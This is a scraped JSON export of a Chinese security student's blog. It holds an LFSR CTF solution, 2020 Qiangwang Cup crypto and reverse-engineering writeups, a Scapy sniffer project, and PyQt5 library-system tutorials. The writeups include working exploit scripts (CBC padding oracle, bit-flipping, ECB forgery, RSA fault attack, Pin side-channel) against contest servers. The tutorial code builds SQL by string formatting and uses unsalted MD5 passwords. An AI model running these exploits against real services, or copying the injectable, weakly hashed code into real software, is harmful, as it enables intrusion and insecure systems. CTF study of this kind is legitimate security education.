Berlekamp_Massey_algorithm(sequence): N = len(sequence) s = sequence[:] for k in range(N): if s[k] == 1: break f = set([k + 1, 0]) # use a set to denote polynomial l = k + 1 g = set([0]) a = k b = 0 for n in range(k + 1, N): d = 0 for ele in f: d ^= s[ele + n - l] if d == 0: b += 1 else: if 2 * l &gt; n: f ^= set([a - b + ele for ele in g]) b += 1 else: temp = f.copy() f = set([b - a + ele for ele in f]) ^ g l = n + 1 - l g = temp a = b b = n - l + 1 # output the polynomial def print_poly(polynomial): lis = sorted(polynomial, reverse=True) mask = [0]*(lis[0]) for i in lis[1:]: mask[i] = 1 mask = &quot;&quot;.join(list(map(str, mask))) mask = mask[::-1] return int(mask,2) return (print_poly(f), l)N = 128if __name__ == '__main__': #seq = (0, 0, 1, 0, 0, 0, 0, 0, 1, 1, 0) seq = 172249955599053439033078493520693122929584790340636422377323636607140227 seq = bin(seq)[2:] for i in tqdm(range(2**19)): out = seq + bin(i)[2:].zfill(19) out = list(map(int, list(out))) (mask, span) = Berlekamp_Massey_algorithm(out) mask = hex(mask) flag = 'flag{' + mask[2:] + '}' if sha256(flag.encode()).hexdigest() == 'cf8b3aa0b672218fa4c7b64eb82186b9d2d022f8faea2a1259e7c9fc5725c196': print(flag) exit(0)参考资料#https://www.anquanke.com/post/id/204846https://github.com/De1ta-team/De1CTF2019/blob/master/writeup/crypto/Babylfsr/Code/exp.sagehttps://badmonkey.site/archives/mt19937.htmlhttps://ctf-wiki.github.io/ctf-wiki/crypto/streamcipher/fsr/lfsr-zh/#b-mhttps://blog.csdn.net/qq_38154820/article/details/108212123https://www.secshi.com/17824.htmlhttps://github.com/Lefnui/ctf-writeups/blob/e3d4efdc73af7de3051e958c8ef04022c9c71ad3/2019/de1ctf/crypto/babylfsr/solve.py","link":"/762edb82.html"},{"title":"PyQt5+Scapy实现网络嗅探器CloudSniffer","text":"CloudSniffer#课程实验，使用Scapy和PyQt5 实现了 一款Mac上的网络嗅探工具CloudSniffer的Github链接功能#基本功能：网卡选择开始、停止抓包清除数据保存数据读取数据退出程序流量包基本信息显示协议分析hexdump内容统计功能流量协议统计（帧数、字节数）流入流量统计（帧数、字节数）流出流量统计（帧数、字节数）流量时间统计（字节数）IP所在地查询其他功能嗅探前过滤、嗅探后过滤html内容提取日志记录效果展示#基本界面统计功能提取html内容安装使用#1234$ git clone https://github.com/ycdxsb/CloudSniffer.git$ cd ./CloudSniffer$ pip3 install requirements.txt$ python3 CloudSniffer.py参考#scapy-httpPcap-Analyser","link":"/e6624f61.html"},{"title":"强网杯2020 部分writeup","text":"简单记录一下做出的几道题目，以后还是科研为主科研为主babyCRT#1234567891011121314151617181920212223242526272829303132333435363738394041424344# task.pyfrom Crypto.Util.number import getPrime, long_to_bytes, getStrongPrimefrom hashlib import sha1from random import randintfrom secret import flag, p, qimport libnumdef gen_t(d): while True: t = getPrime(16) if t % 4 == 3 and libnum.gcd(d, t - 1) == 1: break return tdef sign(m, params): d, p, q, n, t1, t2, e1, e2 = params dp = d % ((p - 1) * (t1 - 1)) dq = d % ((q - 1) * (t2 - 1)) k = getPrime(16) Sp = pow(m + k, dp, p * t1) Sq = pow(m, dq, q * t2) Cp = q * t2 * libnum.invmod(q * t2, p * t1) Cq = p * t1 * libnum.invmod(p * t1, q * t2) S = (Cp * Sp + Cq * Sq) % (n * t1 * t2) c1 = (m - pow(S, e1, t1) + 1) % t1 c2 = (m - pow(S, e2, t2) + 1) % t2 return pow(S, c1 * c2, n)e = 65537assert p &lt; qassert flag == \"flag{\" + sha1(long_to_bytes(p)).hexdigest() + \"}\"n = p*qprint(n)d = libnum.invmod(e, (p - 1) * (q - 1))t1 = gen_t(d)et1 = libnum.invmod(d, t1 - 1)t2 = gen_t(d)et2 = libnum.invmod(d, t2 - 1)params = (d, p, q, n, t1, t2, et1, et2)m = randint(1, n-1)print(m)sig = sign(m, params)print(sig)论文题：http://citeseerx.ist.psu.edu/viewdoc/download?doi=10.1.1.510.3146&amp;rep=rep1&amp;type=pdf结论：$gcd(m^{c_1} - {Sig}^e,N)=p$所以爆破$c_1$就行12345678910111213141516from hashlib import sha1from libnum import gcdfrom Crypto.Util.number import long_to_bytese = 65537n = 26318358382258215770827770763384603359524444566146134039272065206657135513496897321983920652242182112479484135343436206815722605756557098241887233837248519031879444740922789351356138322947108346833956405647578838873425658405513192437479359531790697924285889505666769580176431360506227506064132034621123828090480606055877425480739950809109048177976884825589023444901953529913585288143291544181183810227553891973915960951526154469344587083295640034876874318610991153058462811369615555470571469517472865469502025030548451296909857667669963720366290084062470583318590585472209798523021029182199921435625983186101089395997m = 26275493320706026144196966398886196833815170413807705805287763413013100962831703774640332765503838087434904835657988276064660304427802961609185997964665440867416900711128517859267504657627160598700248689738045243142111489179673375819308779535247214660694211698799461044354352200950309392321861021920968200334344131893259850468214901266208090469265809729514249143938043521579678234754670097056281556861805568096657415974805578299196440362791907408888958917063668867208257370099324084840742435785960681801625180611324948953657666742195051492610613830629731633827861546693629268844700581558851830936504144170791124745540s = 20152941369122888414130075002845764046912727471716839854671280255845798928738103824595339885345405419943354215456598381228519131902698373225795339649300359363119754605698321052334731477127433796964107633109608706030111197156701607379086766944096066649323367976786383015106681896479446835419143225832320978530554399851074180762308322092339721839566642144908864530466017614731679525392259796511789624080228587080621454084957169193343724515867468178242402356741884890739873250658960438450287159439457730127074563991513030091456771906853781028159857466498315359846665211412644316716082898396009119848634426989676119219246for c1 in range(2**16): p = gcd(pow(m, c1, n)-pow(s, e, n), n) if(p != 1 and n % p == 0): q = n//p print(p*q==n) print(\"flag{\" + sha1(long_to_bytes(p)).hexdigest() + \"}\") print(\"flag{\" + sha1(long_to_bytes(q)).hexdigest() + \"}\")bank#nc看了下可以知道是ECB模式加密了sender+receiver+money，所以通过加密可以知道自己的账号对应的密文，同时在recorder里可以看到哪些人在相互转钱，题目让我们可以提供recorder来伪造其他账户转钱给自己，所以思路就很简单了：加密一次，得到自己的账号得到所有已有的其他账户信息伪造recorder让其他账户给自己打钱1234567891011121314151617181920212223242526272829303132333435363738394041424344454647from pwn import *import stringfrom hashlib import sha256import itertools#context.log_level = 'debug'p = remote('39.101.134.52', 8005)def proof_of_work(token): p.recvuntil(&quot;sha256(XXX+&quot;) pad = p.recvuntil(&quot;)&quot;)[:-1] p.recvuntil(&quot; == &quot;) target = bytes.fromhex(p.recvline().strip().decode()) for s in itertools.product(string.printable, repeat=3): if sha256(''.join(s).encode()+pad).digest() == target: p.sendlineafter(&quot;Give me XXX:&quot;, ''.join(s)) p.sendlineafter(&quot;teamtoken:&quot;, token) returntoken = ''proof_of_work(token)p.sendlineafter(&quot;give me your name:&quot;, &quot;ycdxsb&quot;)p.sendlineafter(&quot;&gt; &quot;, &quot;transact&quot;)p.sendlineafter(&quot;&gt; &quot;, &quot;Mote 10&quot;)receiver = p.recvline().strip()[:32]p.sendlineafter(&quot;&gt; &quot;, &quot;view records&quot;)p.recvline()senders = []cashs = []for i in range(10): line = p.recvline().strip() senders.append(line[32:-32]) cashs.append(line[-32:])print(senders)print(cashs)for i in range(10): payload = senders[i]+receiver+cashs[i] p.sendlineafter(&quot;&gt; &quot;, &quot;provide a record&quot;) p.sendlineafter(&quot;&gt; &quot;, payload)p.recvuntil('&gt; ')p.sendline('get flag')import timetime.sleep(1)print(p.recv())modestudy#是真的让人头大六个Chanllege 分别对应：CBC 字节翻转攻击CBC预测ivECB 块加密，可以发现有两个块只差一个字节，可以通过覆盖修改admin=0 为admin=1(session:dfc684a3;timedl=1;admin=0;guess_cookie_ma=1;guess_mp_ab=1;guess_cookie_mb=0;hell_pad=233)ECB padding oracle自己写的ECB块加密，两个字节为一个块，先建立明文和密文的字典，然后直接爆破CBC padding oracle123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155156157158159160161162163164165166167168169170171172173174175176177178179180181182183184185186187188189190191192193194195196197198199200201202203204205206207208209210211212213214215216217218219220import binasciifrom zio import *import stringimport randomimport hashlibimport picklefrom Crypto.Util.number import bytes_to_long, long_to_bytes'''# get Challedge dictidx = 0for key in d.keys(): if(ord(d[key][0])&gt;=idx): idx = ord(d[key][0])for i in range(idx,256): for j in range(32): sendmsg = \"\" for k in range(8): sendmsg += chr(i)+chr(8*j+k) io.read_until('your choice:') io.writeline('1') io.read_until('input(encode hex):') io.writeline(sendmsg.encode('hex')) line = io.readline().strip() line = line.split(':')[1] for k in range(8): d[line[4*k:4*k+4]] = chr(i)+chr(8*j+k) #print(d) with open('challege5.pickle','wb') as f: pickle.dump(d,f)'''def passpow(io, difficulty): io.read_until(\"[+] sha256(\") prefix = io.read_until(\"+\")[:-1] while 1: answer = ''.join(random.choice( string.ascii_letters + string.digits) for i in range(8)) hashresult = hashlib.sha256(prefix+answer).digest() bits = ''.join(bin(ord(j))[2:].zfill(8) for j in hashresult) if bits.startswith('0'*difficulty): io.read_until(\"=\") io.writeline(answer) returntoken = ''ip = '139.224.254.172'target = (ip, 7777)io = zio(target, timeout=1000000, print_read=COLORED( RAW, 'red'), print_write=COLORED(RAW, 'green'))passpow(io, 5)io.writeline(token)# Challege 1io.read_until('your choice:')io.writeline('1')line = io.readline()line = io.readline()message = io.readline().strip().split(' ')[1]cookie = message.split(';checksum=')[0].split(':')[1]checksum = message.split(';checksum=')[1]target = cookie[:31]+'1'print('\\n')print('cookie:'+cookie)print('checksum:'+checksum)print('target:'+target)checksum = long_to_bytes(int(checksum, 16))print([checksum], len(checksum))checksum = checksum[0:15]+chr(0x49 ^ 0x48 ^ ord(checksum[15]))+checksum[16:]result = target+';checksum='+binascii.b2a_hex(checksum)print(\"Challege 1:\", result)io.writeline(result)# Challege 2io.read_until('your choice:')io.writeline('2')line = io.readline()line = io.readline()iv_sha256 = io.readline().strip().split('=')[1]print(iv_sha256)io.read_until('your choice:')io.writeline('1')A = '1'*16B = '1'*16io.read_until('c:')io.writeline(A+B)line = io.readline().strip().split(' ')[1]plaintext = long_to_bytes(int(line,16))D = bytes_to_long(b'1'*16)^bytes_to_long(plaintext[16:])iv = D^bytes_to_long(plaintext[:16])iv = long_to_bytes(iv)print(iv)print(hashlib.sha256(iv).hexdigest())io.read_until('your choice:')io.writeline('2')io.read_until('iv(encode hex):')io.writeline(iv.encode('hex'))# Challege 3io.read_until('your choice:')io.writeline('3')line = io.readline()line = io.readline()cookie = io.readline().strip()[11:]ciphertext = io.readline().strip().split('(cookie):')[1]print('\\n')print(\"cookie:\"+cookie)print(\"ciphtertext:\"+ciphertext)io.read_until('input your encrypted cookie(encode hex):')ciphertext = list(ciphertext)for i in range(32): ciphertext[64+i] = ciphertext[128+i]result = ''.join(ciphertext)io.writeline(result)print(\"Challege 3:\", result)# Challege 4io.read_until('your choice:')io.writeline('4')line = io.readline()line = io.readline()line = io.readline()secret_sha256 = line.split('=')[1]print(\"sha256(secret):\"+secret_sha256)guess = \"\"for i in range(16): for ch in range(256): io.read_until('your choice:') io.writeline('1') sendmsg = chr(ch)+guess+'\\x00'*16 io.read_until('input(encode hex):') io.writeline(sendmsg.encode('hex')) line = io.readline() ciphertext = io.readline().strip().split('msg: ')[1] if(ciphertext[0:32] == ciphertext[64:]): guess = chr(ch)+guess break # io.interact() print(guess)print(\"Challege 4:\", guess)io.read_until('your choice:')io.writeline('2')io.read_until('secret(encode hex):')io.writeline(guess.encode('hex'))# edd11570a9bad21c0d6d97d32cc36674# Challege 5io.read_until('your choice:')io.writeline('5')line = io.readline()line = io.readline()line = io.readline()line = io.readline()line = io.readline()secret = line.strip().split('=')[1]print(\"secret:\"+secret)with open('challege5.pickle','rb') as f: d = pickle.load(f)result = \"\"for i in range(0, 8): result += d[secret[4*i:4*i+4]]print('Challege 5:'+result)io.read_until('your choice:')io.writeline('2')io.read_until('secret(encode hex):')io.writeline(result.encode('hex'))# Challege 6io.read_until('your choice:')io.writeline('6')line = io.readline()line = io.readline()line = io.readline()line = io.readline()line = io.readline()line = io.readline().strip().split(':')[1]iv = long_to_bytes(int(line[:32],16))se_c = long_to_bytes(int(line[32:],16))tmp_iv = map(ord,list(iv))tmp_c = map(ord,list(se_c[:16]))zero = '0'*16ans = [0] * 16for idx in range(16): for num in range(0, 256): io.read_until('your choice:') io.writeline('1') io.read_until('iv+c (encode hex):') tmp_iv[-(1+idx)] = num payload = zero + ''.join(map(chr, tmp_iv+tmp_c)) payload = ''.join(['%02x' % ord(ch) for ch in payload]) io.writeline(payload) if 'error' not in io.readline(): ans[-(1+idx)] = num ^ (idx+1) for j in range(idx+1): tmp_iv[-(j+1)] = ans[-(1+j)] ^ (idx+2) print(ans) break else: raise Exception(\"unknow error\")ans = ''.join(['%02x' % (ch^0x31) for ch in ans])io.read_until('your choice:')io.writeline('2')io.read_until('ecret(encode hex):')io.writeline(ans)io.interact()# 974c3485c74af5a38c874d3c9d03b2c3xx_warmup_obf#应该是被我非预期了23333。一道混淆的re，但我向来是一个不喜欢麻烦的人，所以我抱着侥幸的心理试了下pin的指令数目侧信道，前置知识可以看之前这篇博客(https://blog.ycdxsb.cn/c61763eb.html)可以看到有bad passcode,you got it和you failed it三个不同的字符串根据位置和经验猜测第一个bad passcode是判断输入长度的，所以试了下知道输入长度为28字节然后试了下第一个字节，发现f是指令数最少的，又简单测试了一下第二个l也满足条件，所以直接侧信道走起，吃个饭回来拿flag岂不是美滋滋，可惜题目看的太迟了，第4个做出来，连3血都没拿到12345678910111213141516171819202122232425262728293031323334353637383940414243444546474849import osimport sysimport subprocessclass Shell(object): def runCmd(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) sout, serr = res.communicate() return res.returncode, sout, serr, res.pid def initPin(self, cmd): res = subprocess.Popen(cmd, shell=True, stdin=subprocess.PIPE, stdout=subprocess.PIPE, stderr=subprocess.STDOUT) self.res = res def pinWrite(self, input): self.res.stdin.write(input) def pinRun(self): sout, serr = self.res.communicate() return sout, serrcmd = './pin -t ./source/tools/ManualExamples/obj-intel64/inscount0.so -- ./xx_warmup_obf'shell = Shell()s = \"f\"import stringchs=string.printablechs = string.digits+string.ascii_letters+'{}_'for i in range(27): min_num = 2**32 min_ch = \"\" for ch in chs: tmp = s + ch +(28-len(s)-1)*'a'+'\\n' shell.initPin(cmd) shell.pinWrite(tmp) sout,serr = shell.pinRun() with open('inscount.out') as f: count = f.readline().split(' ')[1] count = int(count) print(count,tmp,sout) if(count&lt;min_num): min_num = count min_ch = ch s+=min_ch print(min_num,min_ch) print('flag:'+s)","link":"/40c735f5.html"},{"title":"PyQt5搭建图书馆管理系统（1）——数据库","text":"PS:由于CSDN太多广告所以弃用了，搬运到了自己的博客写在前面#这学期的数据库大作业要求是做一个简单的图书馆管理系统，刚好之前看过Qt，就打算用Qt来写了，博客记录一些重要的模块和思路要求#编写一个图书管理系统，要求具有以下内容：存储图书信息、采购和淘汰情况、租借情况实现图书采购、淘汰、租借功能。实现图书信息、采购和淘汰、库存、和租借情况查询实现图书的采购、库存、淘汰、租借情况等统计这是要实现的基本功能，当然我觉得做好的话还可以加上读者推荐书目，我喜欢，收藏书目之类的功能大致思路#作为一个管理系统，自然要实现管理员和学生两个方面的内容首先需要登录和注册页面对于管理员，在管理员的管理页面上，会实现图书的采购，淘汰，库存，租借情况查询及统计对于学生，要实现图书的借阅、归还、租借情况查询数据库#使用Sqlite3轻量级数据库作为系统的数据库12345678910111213141516171819202122232425262728293031323334353637CREATE TABLE User ( StudentId CHAR(10) UNIQUE NOT NULL, Name VARCHAR(20), Password CHAR(32) NOT NULL, IsAdmin BIT DEFAULT 0, TimesBorrowed INT DEFAULT 0, NumBorrowed INT DEFAULT 0);CREATE TABLE Book ( BookName VARCHAR(30) NOT NULL, BookId CHAR(6) NOT NULL, Auth VARCHAR(20) NOT NULL, Category VARCHAR(10) DEFAULT NULL, Publisher VARCHAR(30) DEFAULT NULL, PublishTime DATE, NumStorage INT DEFAULT 0, NumCanBorrow INT DEFAULT 0, NumBorrowed INT DEFAULT 0);CREATE TABLE User_Book ( StudentId CHAR(10) UNIQUE NOT NULL, BookId CHAR(6) NOT NULL, BorrowTime DATE, ReturnTime DATE, BorrowState BIT DEFAULT 0);CREATE TABLE BuyOrDrop ( BookId CHAR(6) NOT NULL, Time DATE, BuyOrDrop BIT DEFAULT 0, Number INT DEFAULT 0);INSERT INTO User VALUES ('0000000000', '管理员', 'f9687b82c237c8868a92ffa548c0a16a', 1, 0, 0);所有管理员使用同一账户 ，password使用md5加密User表#StudentId：学号Name：姓名Password：密码IsAdmin：是否为管理员TimesBorrowed：借阅次数NumBorrowed：已借书数量Book表#BookName：书名BookId：书号Auth：作者CateGory：分类Publisher：出版社PublishTime：出版时间NumStorage：库存量NumCanBorrowed：可借量NumBorrowed：被借阅次数User_Book表#分别为学号，书号，借阅时间，归还时间，借阅状态BuyOrDrop表#分别为书号，添加或淘汰时间，添加还是淘汰，数量最后附上链接#项目地址：github仓库链接","link":"/51f03b47.html"},{"title":"PyQt5搭建图书馆管理系统（2）——注册页面设计","text":"我觉得最cd的就是QtDesigner虽然适合快速开发UI，但是我总用不好，只能纯代码来实现界面了。现在大家能看到的一开始的UI设计和一点逻辑，并不包含总体应用的的逻辑体系代码：#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129130131132133134135136137138139140141142143144145146147148149150151152153154155import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstylefrom PyQt5.QtSql import *import hashlibclass SignUpWidget(QWidget): student_signup_signal = pyqtSignal(str) def __init__(self): super().__init__() self.setUpUI() def setUpUI(self): self.resize(900, 600) self.setWindowTitle(&quot;欢迎登陆图书馆管理系统&quot;) self.signUpLabel = QLabel(&quot;注 册&quot;) self.signUpLabel.setAlignment(Qt.AlignCenter) # self.signUpLabel.setFixedWidth(300) self.signUpLabel.setFixedHeight(100) font = QFont() font.setPixelSize(36) lineEditFont = QFont() lineEditFont.setPixelSize(16) self.signUpLabel.setFont(font) self.layout = QVBoxLayout() self.layout.addWidget(self.signUpLabel, Qt.AlignHCenter) self.setLayout(self.layout) # 表单，包括学号，姓名，密码，确认密码 self.formlayout = QFormLayout() font.setPixelSize(18) # Row1 self.studentIdLabel = QLabel(&quot;学 号: &quot;) self.studentIdLabel.setFont(font) self.studentIdLineEdit = QLineEdit() self.studentIdLineEdit.setFixedWidth(180) self.studentIdLineEdit.setFixedHeight(32) self.studentIdLineEdit.setFont(lineEditFont) self.studentIdLineEdit.setMaxLength(10) self.formlayout.addRow(self.studentIdLabel, self.studentIdLineEdit) # Row2 self.studentNameLabel = QLabel(&quot;姓 名: &quot;) self.studentNameLabel.setFont(font) self.studentNameLineEdit = QLineEdit() self.studentNameLineEdit.setFixedHeight(32) self.studentNameLineEdit.setFixedWidth(180) self.studentNameLineEdit.setFont(lineEditFont) self.studentNameLineEdit.setMaxLength(10) self.formlayout.addRow(self.studentNameLabel, self.studentNameLineEdit) lineEditFont.setPixelSize(10) # Row3 self.passwordLabel = QLabel(&quot;密 码: &quot;) self.passwordLabel.setFont(font) self.passwordLineEdit = QLineEdit() self.passwordLineEdit.setFixedWidth(180) self.passwordLineEdit.setFixedHeight(32) self.passwordLineEdit.setFont(lineEditFont) self.passwordLineEdit.setEchoMode(QLineEdit.Password) self.passwordLineEdit.setMaxLength(16) self.formlayout.addRow(self.passwordLabel, self.passwordLineEdit) # Row4 self.passwordConfirmLabel = QLabel(&quot;确认密码: &quot;) self.passwordConfirmLabel.setFont(font) self.passwordConfirmLineEdit = QLineEdit() self.passwordConfirmLineEdit.setFixedWidth(180) self.passwordConfirmLineEdit.setFixedHeight(32) self.passwordConfirmLineEdit.setFont(lineEditFont) self.passwordConfirmLineEdit.setEchoMode(QLineEdit.Password) self.passwordConfirmLineEdit.setMaxLength(16) self.formlayout.addRow(self.passwordConfirmLabel, self.passwordConfirmLineEdit) # Row5 self.signUpbutton = QPushButton(&quot;注 册&quot;) self.signUpbutton.setFixedWidth(120) self.signUpbutton.setFixedHeight(30) self.signUpbutton.setFont(font) self.formlayout.addRow(&quot;&quot;, self.signUpbutton) widget = QWidget() widget.setLayout(self.formlayout) widget.setFixedHeight(250) widget.setFixedWidth(300) self.Hlayout = QHBoxLayout() self.Hlayout.addWidget(widget, Qt.AlignCenter) widget = QWidget() widget.setLayout(self.Hlayout) self.layout.addWidget(widget, Qt.AlignHCenter) # 设置验证 reg = QRegExp(&quot;PB[0~9]{8}&quot;) pValidator = QRegExpValidator(self) pValidator.setRegExp(reg) self.studentIdLineEdit.setValidator(pValidator) reg = QRegExp(&quot;[a-zA-z0-9]+$&quot;) pValidator.setRegExp(reg) self.passwordLineEdit.setValidator(pValidator) self.passwordConfirmLineEdit.setValidator(pValidator) self.signUpbutton.clicked.connect(self.SignUp) self.studentIdLineEdit.returnPressed.connect(self.SignUp) self.studentNameLineEdit.returnPressed.connect(self.SignUp) self.passwordLineEdit.returnPressed.connect(self.SignUp) self.passwordConfirmLineEdit.returnPressed.connect(self.SignUp) def SignUp(self): studentId = self.studentIdLineEdit.text() studentName = self.studentNameLineEdit.text() password = self.passwordLineEdit.text() confirmPassword = self.passwordConfirmLineEdit.text() if (studentId == &quot;&quot; or studentName == &quot;&quot; or password == &quot;&quot; or confirmPassword == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;表单不可为空，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return else: # 需要处理逻辑，1.账号已存在;2.密码不匹配;3.插入user表 db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() if (confirmPassword != password): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;两次输入密码不一致，请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return elif (confirmPassword == password): # md5编码 hl = hashlib.md5() hl.update(password.encode(encoding='utf-8')) md5password = hl.hexdigest() sql = &quot;SELECT * FROM user WHERE StudentId='%s'&quot; % (studentId) query.exec_(sql) if (query.next()): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;该账号已存在,请重新输入&quot;, QMessageBox.Yes, QMessageBox.Yes)) return else: sql = &quot;INSERT INTO user VALUES ('%s','%s','%s',0,0,0)&quot; % ( studentId, studentName, md5password) db.exec_(sql) db.commit() print(QMessageBox.information(self, &quot;提醒&quot;, &quot;您已成功注册账号!&quot;, QMessageBox.Yes, QMessageBox.Yes)) self.student_signup_signal.emit(studentId) db.close() returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = SignUpWidget() mainMindow.show() sys.exit(app.exec_())setUpUI用来初始化UI界面signUp实现在注册过程中的逻辑以及对数据库的操作，按理说应该把数据库操作单独写一个模块的，不过我很懒…注册成功暂时只是把数据插入了数据库，本来应该加上跳转页面之类的操作如果觉得黑色的效果很好看的话，大家也可以调用经典的QSSstyle表qdarkstyle##实现效果最后附上链接#项目地址：github仓库链接","link":"/72587310.html"},{"title":"PyQt5搭建图书馆管理系统（3）——登录页面设计","text":"分析#登录页面的逻辑很简单，如下：用户输入学号和密码（安全起见，加上输入检测）如果密码错误或者用户名不存在，则给出提示如果正确，则进行跳转代码：#123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990919293949596979899100101102103104105106107108109110111112113114115116117118119120121122123124125126127128129import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstyleimport hashlibfrom PyQt5.QtSql import *class SignInWidget(QWidget): is_admin_signal = pyqtSignal() is_student_signal = pyqtSignal(str) def __init__(self): super(SignInWidget, self).__init__() self.resize(900, 600) self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;) self.setUpUI() def setUpUI(self): self.Vlayout = QVBoxLayout(self) self.Hlayout1 = QHBoxLayout() self.Hlayout2 = QHBoxLayout() self.formlayout = QFormLayout() self.label1 = QLabel(&quot;学号: &quot;) labelFont = QFont() labelFont.setPixelSize(18) lineEditFont = QFont() lineEditFont.setPixelSize(16) self.label1.setFont(labelFont) self.lineEdit1 = QLineEdit() self.lineEdit1.setFixedHeight(32) self.lineEdit1.setFixedWidth(180) self.lineEdit1.setFont(lineEditFont) self.lineEdit1.setMaxLength(10) self.formlayout.addRow(self.label1, self.lineEdit1) self.label2 = QLabel(&quot;密码: &quot;) self.label2.setFont(labelFont) self.lineEdit2 = QLineEdit() self.lineEdit2.setFixedHeight(32) self.lineEdit2.setFixedWidth(180) self.lineEdit2.setMaxLength(16) # 设置验证 reg = QRegExp(&quot;PB[0~9]{8}&quot;) pValidator = QRegExpValidator(self) pValidator.setRegExp(reg) self.lineEdit1.setValidator(pValidator) reg = QRegExp(&quot;[a-zA-z0-9]+$&quot;) pValidator.setRegExp(reg) self.lineEdit2.setValidator(pValidator) passwordFont = QFont() passwordFont.setPixelSize(10) self.lineEdit2.setFont(passwordFont) self.lineEdit2.setEchoMode(QLineEdit.Password) self.formlayout.addRow(self.label2, self.lineEdit2) self.signIn = QPushButton(&quot;登 录&quot;) self.signIn.setFixedWidth(80) self.signIn.setFixedHeight(30) self.signIn.setFont(labelFont) self.formlayout.addRow(&quot;&quot;, self.signIn) self.label = QLabel(&quot;欢迎使用图书馆管理系统&quot;) fontlabel = QFont() fontlabel.setPixelSize(30) self.label.setFixedWidth(390) # self.label.setFixedHeight(80) self.label.setFont(fontlabel) self.Hlayout1.addWidget(self.label, Qt.AlignCenter) self.widget1 = QWidget() self.widget1.setLayout(self.Hlayout1) self.widget2 = QWidget() self.widget2.setFixedWidth(300) self.widget2.setFixedHeight(150) self.widget2.setLayout(self.formlayout) self.Hlayout2.addWidget(self.widget2, Qt.AlignCenter) self.widget = QWidget() self.widget.setLayout(self.Hlayout2) self.Vlayout.addWidget(self.widget1) self.Vlayout.addWidget(self.widget, Qt.AlignTop) self.signIn.clicked.connect(self.signInCheck) self.lineEdit2.returnPressed.connect(self.signInCheck) self.lineEdit1.returnPressed.connect(self.signInCheck) def signInCheck(self): studentId = self.lineEdit1.text() password = self.lineEdit2.text() if (studentId == &quot;&quot; or password == &quot;&quot;): print(QMessageBox.warning(self, &quot;警告&quot;, &quot;学号和密码不可为空!&quot;, QMessageBox.Yes, QMessageBox.Yes)) return # 打开数据库连接 db = QSqlDatabase.addDatabase(&quot;QSQLITE&quot;) db.setDatabaseName('./db/LibraryManagement.db') db.open() query = QSqlQuery() sql = &quot;SELECT * FROM user WHERE StudentId='%s'&quot; % (studentId) query.exec_(sql) db.close() hl = hashlib.md5() hl.update(password.encode(encoding='utf-8')) if (not query.next()): print(QMessageBox.information(self, &quot;提示&quot;, &quot;该账号不存在!&quot;, QMessageBox.Yes, QMessageBox.Yes)) else: if (studentId == query.value(0) and hl.hexdigest() == query.value(2)): # 如果是管理员 if (query.value(3)==1): self.is_admin_signal.emit() else: self.is_student_signal.emit(studentId) else: print(QMessageBox.information(self, &quot;提示&quot;, &quot;密码错误!&quot;, QMessageBox.Yes, QMessageBox.Yes)) returnif __name__ == &quot;__main__&quot;: app = QApplication(sys.argv) app.setWindowIcon(QIcon(&quot;./images/MainWindow_1.png&quot;)) app.setStyleSheet(qdarkstyle.load_stylesheet_pyqt5()) mainMindow = SignInWidget() mainMindow.show() sys.exit(app.exec_())效果如下#最后附上链接#项目地址：github仓库链接","link":"/98a38c48.html"},{"title":"PyQt5搭建图书馆管理系统（4）——管理员主页设计","text":"分析#在管理员主页，为了完成初步的功能，即添加书本，淘汰书本，查看库存，我们需要设计以下：一个添加书本的Dialog，通过一个button启用一个淘汰书本的Dialog，通过一个button启用一个查看库存的Table， 一开始打算用一个button启用的，后来觉得直接放主页也挺好的，所以并没有用button启用（虽然依然放在设计中）代码#1234567891011121314151617181920212223242526272829303132333435363738394041424344454647484950515253545556575859606162636465666768697071import sysfrom PyQt5.QtWidgets import *from PyQt5.QtGui import *from PyQt5.QtCore import *import qdarkstylefrom addBookDialog import addBookDialogfrom dropBookDialog import dropBookDialogfrom BookStorageViewer import BookStorageViewerfrom UserManage import UserManageclass AdminHome(QWidget): def __init__(self): super().__init__() self.setUpUI() def setUpUI(self): self.resize(900, 600) self.setWindowTitle(&quot;欢迎使用图书馆管理系统&quot;) self.layout = QHBoxLayout() self.buttonlayout = QVBoxLayout() self.setLayout(self.layout) font = QFont() font.setPixelSize(16) self.userManageButton = QPushButton(&quot;用户管理&quot;) self.addBookButton = QPushButton(&quot;添加书籍&quot;) self.dropBookButton = QPushButton(&quot;淘汰书籍&quot;) self.userManageButton.setFont(font) self.addBookButton.setFont(font) self.dropBookButton.setFont(font) self.userManageButton.setFixedWidth(100) self.userManageButton.setFixedHeight(42) self.addBookButton.setFixedWidth(100) self.addBookButton.setFixedHeight(42) self.dropBookButton.setFixedWidth(100) self.dropBookButton.setFixedHeight(42) self.buttonlayout.addWidget(self.addBookButton) self.buttonlayout.addWidget(self.dropBookButton) self.buttonlayout.addWidget(self.userManageButton) self.layout.addLayout(self.buttonlayout) self.storageView = BookStorageViewer() self.layout.addWidget(self.storageView) self.addBookButton.clicked.connect(self.addBookButtonClicked) self.dropBookButton.clicked.connect(self.dropBookButtonClicked) self.userManageButton.clicked.connect(self.userManage) def addBookButtonClicked(self): addDialog = addBookDialog(self) 